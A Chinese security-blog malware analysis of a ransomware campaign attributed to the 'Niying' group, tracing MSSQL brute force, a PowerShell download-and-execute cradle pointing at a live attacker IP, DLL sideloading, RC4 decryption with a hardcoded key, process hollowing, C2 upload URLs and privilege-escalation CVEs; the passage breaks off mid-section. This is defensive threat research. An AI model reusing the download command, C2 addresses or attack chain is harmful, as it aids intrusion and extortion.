---
title: “匿影”组织再次活跃——通过爆破数据库发起勒索攻击
url: https://www.freebuf.com/articles/es/351984.html
source: FreeBuf网络安全行业门户
date: 2022-12-10
fetch_date: 2025-10-04T01:07:09.225979
---

# “匿影”组织再次活跃——通过爆破数据库发起勒索攻击

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

“匿影”组织再次活跃——通过爆破数据库发起勒索攻击

* ![]()
* 关注

* [企业安全](https://www.freebuf.com/articles/es)

“匿影”组织再次活跃——通过爆破数据库发起勒索攻击

2022-12-09 14:32:13

所属地 北京

## **事件概述**

近期，有客户反馈服务器文件被加密，新华三攻防实验室立即响应。在排查过程中，发现中毒主机上有大量MSSQL爆破日志及PowerShell运行日志。通过对日志及关联样本进行分析，最终判定此次攻击为“匿影”组织所为。

“匿影”组织于2019年3月份首次被披露，从被披露的3年来，该组织一直保持较高的活跃度，变种也在持续升级。在早期活动中，“匿影”使用永恒之蓝漏洞向受害者计算机植入挖矿病毒，利用中毒主机资源挖取门罗币为主的加密数字货币。2020年4月份，一场在全网大规模传播“WannaRen”勒索病毒事件引起广泛关注，经溯源分析，其幕后黑手正是“匿影”组织。12月份，研究人员在“匿影”的攻击活动中发现了一个新的自称为CryptoJoker勒索模块，索要赎金从“WannaRen”的0.05BTC涨至0.1BTC；在随后的“匿影”攻击套件中还发现了文件窃密模块，新的窃密模块主要对用户的虚拟货币钱包、密码等重要文件数据进行窃取。在国家对挖矿活动整治的背景下，该组织成功拓展了勒索、窃密等能力。并且，我们在之后的“匿影”组织攻击活动跟踪中，发现多数事件均以勒索为目的，表明该组织已经将重心从挖矿转向勒索攻击。

![1670559806_6392b83ec7abe79c81e3a.png!small?1670559808090](https://image.3001.net/images/20221209/1670559806_6392b83ec7abe79c81e3a.png!small?1670559808090)

"匿影"组织近年发起的主要攻击事件

## **事件分析**

### **攻击流程**

![1670559828_6392b8547aa8f982a88f3.png!small?1670559830078](https://image.3001.net/images/20221209/1670559828_6392b8547aa8f982a88f3.png!small?1670559830078)

新华三攻防实验室还原“匿影”完整勒索攻击过程

## **样本分析**

### **初始入侵**

通过MSSQL扫描爆破获取中毒主机权限，最终执行PowerShell指令，下载cpu2.txt到本地执行

![1670559854_6392b86e6a9422a78cee8.png!small?1670559855786](https://image.3001.net/images/20221209/1670559854_6392b86e6a9422a78cee8.png!small?1670559855786)

解码为：

IEX((new-objectnet.webclient).downloadstring ('http://185.198.166.202/cpu2.txt'))

### **载荷下载**

cpu2.txt实际是powershell下载器

![1670559870_6392b87e1c4a3ac770891.png!small?1670559871464](https://image.3001.net/images/20221209/1670559870_6392b87e1c4a3ac770891.png!small?1670559871464)

下载各种文件至C:\Users\Public文件夹下

![1670559876_6392b88463eeb79f50731.png!small?1670559877829](https://image.3001.net/images/20221209/1670559876_6392b88463eeb79f50731.png!small?1670559877829)

下载完成后，cpu2.txt会执行ms.exe。

### **白加黑利用**

ms.exe主要负责执行lu.exe，利用白加黑技术躲避杀软检测，执行后续攻击。

![1670559884_6392b88c000e2281f005d.png!small?1670559885407](https://image.3001.net/images/20221209/1670559884_6392b88c000e2281f005d.png!small?1670559885407)

lu.exe是白文件，原文件名"Start.exe"，Sandboxie相关，包含有效证书。

![1670559890_6392b89245ffa7359ba13.png!small?1670559891752](https://image.3001.net/images/20221209/1670559890_6392b89245ffa7359ba13.png!small?1670559891752)

lu.exe会加载SbieDll.dll，该dll为黑文件，负责解密执行123.txt。

![1670559901_6392b89de36e8f2371dd3.png!small?1670559903083](https://image.3001.net/images/20221209/1670559901_6392b89de36e8f2371dd3.png!small?1670559903083)

### **勒索实施**

**1、123.txt**

|  |  |
| --- | --- |
| 原始文件名 | 123.txt |
| MD5 | ad7a2de6004989b98f45f025419ae4bb |
| 文件大小 | 1.73 MB |
| 文件类型 | Text/plain |

123.txt内容经过Base64编码，解码后，得到一个整型的宽字节数组。

![1670559929_6392b8b9e0f8abe297e37.png!small?1670559931453](https://image.3001.net/images/20221209/1670559929_6392b8b9e0f8abe297e37.png!small?1670559931453)

将该整数组转为bytes类型后得到一个未知类型文件，经分析，该文件由一段shellcode和一个恶意可执行PE文件“123\_dump”组合构成。

![1670559938_6392b8c26cedb1426562c.png!small?1670559939776](https://image.3001.net/images/20221209/1670559938_6392b8c26cedb1426562c.png!small?1670559939776)

Shellcode用来解密出被混淆的API，通过调用VirtualAlloc，VirtualProtect等API，加载“123\_dump”到新分配内存空间中执行。

**2、123\_dump——解密执行shell.txt**

样本运行后，首先会查找目录C:\users\public下是否有1949.txt，该文件的存在是决定程序是否继续执行的标志，但程序并未加载解析1949.txt的内容。

![1670559953_6392b8d1872579e7848f4.png!small?1670559954835](https://image.3001.net/images/20221209/1670559953_6392b8d1872579e7848f4.png!small?1670559954835)

进程提权，程序会查询当前进程，实现系统级别提权。

![1670559960_6392b8d8ae5eb27caab6c.png!small?1670559962113](https://image.3001.net/images/20221209/1670559960_6392b8d8ae5eb27caab6c.png!small?1670559962113)

解密shell.txt。程序会拼接当前程序目录C:\User\Public\shell.txt查找shell.txt, 若文件存在，则加载到申请的内存空间中。shell.txt本身是经过加密的文件，无法直接执行。程序随即通过硬编码的解密算法字符串“RC4”和密钥“999888”作为参数传入sub\_10001DFB函数中。

![1670559968_6392b8e09231b3f642905.png!small?1670559969892](https://image.3001.net/images/20221209/1670559968_6392b8e09231b3f642905.png!small?1670559969892)

经分析sub\_10001DFB函数中，不仅支持RC4算法解密，还包括对RC2，DES，3DES，AES192，AES256，以及对分组加密的五种模式CBC，ECB，OFB，CFB CTR进行解密。

RC4解密完成后，在新分配的内存空间中得到一个可执行PE文件。

![1670560009_6392b9097f680e9ab26fd.png!small?1670560011165](https://image.3001.net/images/20221209/1670560009_6392b9097f680e9ab26fd.png!small?1670560011165)

随后程序使用进程镂空方式将该恶意PE文件注入到系统程序servces.exe并执行。

![1670560015_6392b90fcef8fc9f4a380.png!small?1670560017187](https://image.3001.net/images/20221209/1670560015_6392b90fcef8fc9f4a380.png!small?1670560017187)

**3、shell.txt**

|  |  |
| --- | --- |
| **MD5** | **96cec5f391836920f1442a6492b02bd8** |
| **文件大小** | 4.28 MB (4,489,216 字节) |
| **文件类型** | PE32，exe |
| **时间戳** | 2022-09-01 09:46:31 |
| **编译信息** | Microsoft Visual C/C++(6.0 (1720-9782))[EXE32] |
| **C&C** | m.mssqlnewpro.com |

shell.txt包含了11个子PE文件，用以实现提权、终止进程、终止服务、加密文件的功能，主要调用关系如下：

![1670560026_6392b91adce0018fa75b6.png!small?1670560028137](https://image.3001.net/images/20221209/1670560026_6392b91adce0018fa75b6.png!small?1670560028137)

为方便描述，将子PE文件命名为shell.txt.decrypted2.v~shell.txt.decrypted12.v，具体分析见下文。

（1） shell.txt

创建事件对象：ezrxtcfyvgihuewawaeewekb

![1670560037_6392b925220465c1cc3dc.png!small?1670560038396](https://image.3001.net/images/20221209/1670560037_6392b925220465c1cc3dc.png!small?1670560038396)

判断是否有管理员权限，取不同标识字符串，管理员为“zzz”，非管理员为“jjj”

![1670560043_6392b92b24566b189cf78.png!small?1670560044829](https://image.3001.net/images/20221209/1670560043_6392b92b24566b189cf78.png!small?1670560044829)

获取主机名、用户名、公网IP等信息，与权限标识字符串拼接成一个字符串作为文件名称

![1670560057_6392b939b3a306a8fec54.png!small?1670560059059](https://image.3001.net/images/20221209/1670560057_6392b939b3a306a8fec54.png!small?1670560059059)

回传信息至：

hxxp://m.mssqlnewpro.com/mssqlzzz/upload.php

![1670560064_6392b940b168ba0a5a0f2.png!small?1670560066232](https://image.3001.net/images/20221209/1670560064_6392b940b168ba0a5a0f2.png!small?1670560066232)

然后，创建cmd.exe或notepad.exe进程并注入恶意载荷shell.txt.decrypted.2.v实施勒索攻击。

![1670560071_6392b9475c0641ca9c9b6.png!small?1670560072583](https://image.3001.net/images/20221209/1670560071_6392b9475c0641ca9c9b6.png!small?1670560072583)

在非管理员权限下，shell.txt释放C:\Users\Public\a.dll、C:\Users\Public\CVE20211675.exe、C:\Users\Public\MSFRottenPotato.exe等PE文件，利用CVE-2021-1675、CVE-2021-1732、CVE-2022-21882等漏洞进行提权，并重新执行lu.exe文件。

![1670560076_6392b94cf12278f232a1a.png!small?1670560078421](https://image.3001.net/images/20221209/1670560076_6392b94cf12278f232a1a.png!small?1670560078421)

（2）shell.txt.decrypted.2.v

|  |  |
| --- | --- |
| **MD5** | **2762cf71bb00085bf326d02133ac47c1** |
| **文件大小** | 636 KB (651,264 字节) |
| **文件类型** | PE32，exe |
| **时间戳** | 2022-09-01 09:42:39 |
| **编译信息** | Microsoft Visual C/C++(6.0 (1720-9782))[EXE32] |
| **C&C** | m.mssqlnewpro.com |

判断是否为管理员，取不同标识字符串：

![1670560088_6392b9586abf06f96a5cd.png!small?1670560089611](https://image.3001.net/images/20221209/1670560088_6392b9586abf06f96a5cd.png!small?1670560089611)

另外创建一个线程，下载 hxxps://m.mssqlnewpro.com/admin.jpg ，对其进行RC4 解密，key为"999888"，然后通过进程注入执行。该解密方式和key与123.txt解密shell.txt一致。

![1670560098_6392b9621469e06599ed0.png!small?1670560099310](https://image.3001.net/images/20221209/1670560098_6392b9621469e06599ed0.png!small?1670560099310)

再次判断管理员权限，如果是管理员，则：

先删除之前下载的文件防止溯源分析，部分如下：

![1670560104_6392b9687e383db87cad3.png!small?1670560106389](https://image.3001.net/images/20221209/1670560104_6...